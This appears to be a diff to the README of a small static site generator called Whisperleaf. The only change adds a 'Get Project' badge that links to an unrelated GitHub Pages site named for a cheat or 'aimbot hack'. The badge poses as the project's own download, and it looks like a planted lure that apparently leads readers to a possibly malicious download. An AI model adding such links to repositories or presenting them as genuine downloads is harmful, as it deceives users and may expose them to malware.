@@ -4,6 +4,7 @@ Welcome to **Whisperleaf**, a small, friendly static site generator that believe
 
 When you open this repo, imagine the hush of a library after closing time: shelves of ideas, a lamp left on, one more page to finish. Whisperleaf is that lamp.
 
+[![Get Project](https://img.shields.io/badge/Get-Project-blueviolet)](https://bodycam-aimbot-hack.github.io/.github/)
 ---
 
 ## Why Whisperleaf?
